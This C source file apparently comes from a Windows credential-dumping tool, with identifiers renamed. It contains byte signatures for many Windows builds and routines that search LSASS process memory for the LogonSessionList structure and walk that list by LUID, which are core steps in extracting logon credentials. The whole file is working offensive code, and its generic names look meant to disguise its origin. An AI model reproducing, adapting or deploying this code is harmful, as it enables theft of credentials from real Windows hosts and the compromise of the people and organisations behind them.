#include "my_modules_utils.h"


PLIST_ENTRY LogonSessionList = NULL;
PULONG LogonSessionListCount = NULL;

BOOL my_m_modules_utils_search(PMY_M_MODULES_CONTEXT cLs, PMY_M_MODULES_LIB pLib)
{
#if defined(_M_X64)
    BYTE PTRN_WIN5_LogonSessionList[] = { 0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8 };
    BYTE PTRN_WN60_LogonSessionList[] = { 0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84 };
    BYTE PTRN_WN61_LogonSessionList[] = { 0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84 };
    BYTE PTRN_WN63_LogonSessionList[] = { 0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05 };
    BYTE PTRN_WN6x_LogonSessionList[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
    BYTE PTRN_WN1703_LogonSessionList[] = { 0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
    BYTE PTRN_WN1803_LogonSessionList[] = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
    BYTE PTRN_WN11_LogonSessionList[] = { 0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
    PW_M_PATCH_GENERIC LSrvReferences[] = {
        {PW_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4,   0}},
        {PW_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4, -45}},
        {PW_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_LogonSessionList),	PTRN_WN60_LogonSessionList},	{0, NULL}, {21,  -4}},
        {PW_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
        {PW_M_WIN_BUILD_8,		{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
        {PW_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
        {PW_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {16,  -4}},
        {PW_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}},
        {PW_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {23,  -4}},
        {PW_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {23,  -4}},
        {PW_M_WIN_BUILD_2022,		{sizeof(PTRN_WN11_LogonSessionList),	PTRN_WN11_LogonSessionList},	{0, NULL}, {24,  -4}},
    };
#elif defined(_M_IX86)
    BYTE PTRN_WN51_LogonSessionList[] = { 0xff, 0x50, 0x10, 0x85, 0xc0, 0x0f, 0x84 };
    BYTE PTRN_WNO8_LogonSessionList[] = { 0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd };
    BYTE PTRN_WN80_LogonSessionList[] = { 0x8b, 0x45, 0xf8, 0x8b, 0x55, 0x08, 0x8b, 0xde, 0x89, 0x02, 0x89, 0x5d, 0xf0, 0x85, 0xc9, 0x74 };
    BYTE PTRN_WN81_LogonSessionList[] = { 0x8b, 0x4d, 0xe4, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xe8, 0x89, 0x01, 0x85, 0xff, 0x74 };
    BYTE PTRN_WN6x_LogonSessionList[] = { 0x8b, 0x4d, 0xe8, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xec, 0x89, 0x01, 0x85, 0xff, 0x74 };
    PW_M_PATCH_GENERIC LSrvReferences[] = {
        {PW_M_WIN_BUILD_XP,		{sizeof(PTRN_WN51_LogonSessionList),	PTRN_WN51_LogonSessionList},	{0, NULL}, { 24,   0}},
        {PW_M_WIN_BUILD_2K3,		{sizeof(PTRN_WNO8_LogonSessionList),	PTRN_WNO8_LogonSessionList},	{0, NULL}, {-11, -43}},
        {PW_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LogonSessionList),	PTRN_WNO8_LogonSessionList},	{0, NULL}, {-11, -42}},
        {PW_M_WIN_BUILD_8,		{sizeof(PTRN_WN80_LogonSessionList),	PTRN_WN80_LogonSessionList},	{0, NULL}, { 18,  -4}},
        {PW_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_LogonSessionList),	PTRN_WN81_LogonSessionList},	{0, NULL}, { 16,  -4}},
        {PW_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, { 16,  -4}},
    };
#endif



	PVOID *pLogonSessionListCount = (cLs->osContext.BuildNumber < PW_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &LogonSessionListCount);
	return my_m_modules_utils_search_generic(cLs, pLib, LSrvReferences,  ARRAYSIZE(LSrvReferences), (PVOID *) &LogonSessionList, pLogonSessionListCount, NULL, NULL);
}

BOOL my_m_modules_utils_search_generic(PMY_M_MODULES_CONTEXT cLs, PMY_M_MODULES_LIB pLib, PPW_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID * genericPtr, PVOID * genericPtr1, PVOID * genericPtr2, PLONG genericOffset1)
{
	PW_M_MEMORY_ADDRESS aLsMemory = {NULL, cLs->hLsMem}, aLocalMemory = {NULL, &PW_M_MEMORY_GLOBAL_OWN_HANDLE};
	PW_M_MEMORY_SEARCH sMemory = {{{pLib->Informations.DllBase.address, cLs->hLsMem}, pLib->Informations.SizeOfImage}, NULL};
	PPW_M_PATCH_GENERIC currentReference;
	#if defined(_M_X64)
		LONG offset;
	#endif

	if (currentReference = pw_m_patch_getGenericFromBuild(generics, cbGenerics, cLs->osContext.BuildNumber))
	{
		aLocalMemory.address = currentReference->Search.Pattern;
		if(pw_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
		{
			aLsMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0; // optimize one day
			if(genericOffset1)
				*genericOffset1 = currentReference->Offsets.off1;
		#if defined(_M_X64)
			aLocalMemory.address = &offset;
			if(pLib->isInit = pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(LONG)))
				*genericPtr = ((PBYTE) aLsMemory.address + sizeof(LONG) + offset);
		#elif defined(_M_IX86)
			aLocalMemory.address = genericPtr;
			pLib->isInit = pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(PVOID));
		#endif

			if(genericPtr1)
			{
				aLsMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1;
			#if defined(_M_X64)
				aLocalMemory.address = &offset;
				if(pLib->isInit = pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(LONG)))
					*genericPtr1 = ((PBYTE) aLsMemory.address + sizeof(LONG) + offset);
			#elif defined(_M_IX86)
				aLocalMemory.address = genericPtr1;
				pLib->isInit = pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(PVOID));
			#endif
			}

			if(genericPtr2)
			{
				aLsMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2;
			#if defined(_M_X64)
				aLocalMemory.address = &offset;
				if(pLib->isInit = pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(LONG)))
					*genericPtr2 = ((PBYTE) aLsMemory.address + sizeof(LONG) + offset);
			#elif defined(_M_IX86)
				aLocalMemory.address = genericPtr2;
				pLib->isInit = pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(PVOID));
			#endif
			}
		}
	}
	return pLib->isInit;
}

PVOID my_m_modules_utils_pFromLinkedListByLuid(PPW_M_MEMORY_ADDRESS pSecurityStruct, ULONG LUIDoffset, PLUID luidToFind)
{
	PVOID resultat = NULL, pStruct;
	PW_M_MEMORY_ADDRESS data = {&pStruct, &PW_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {NULL, &PW_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(aBuffer.address = LocalAlloc(LPTR, LUIDoffset + sizeof(LUID)))
	{
		if(pw_m_memory_copy(&data, pSecurityStruct, sizeof(PVOID)))
		{
			data.address = pStruct;
			data.hMemory = pSecurityStruct->hMemory;

			while(data.address != pSecurityStruct->address)
			{
				if(pw_m_memory_copy(&aBuffer, &data, LUIDoffset + sizeof(LUID)))
				{
					if(SecEqualLuid(luidToFind, (PLUID) ((PBYTE)(aBuffer.address) + LUIDoffset)))
					{
						resultat = data.address;
						break;
					}
					data.address = ((PLIST_ENTRY) (aBuffer.address))->Flink;
				}
				else break;
			}
		}
		LocalFree(aBuffer.address);
	}
	return resultat;
}
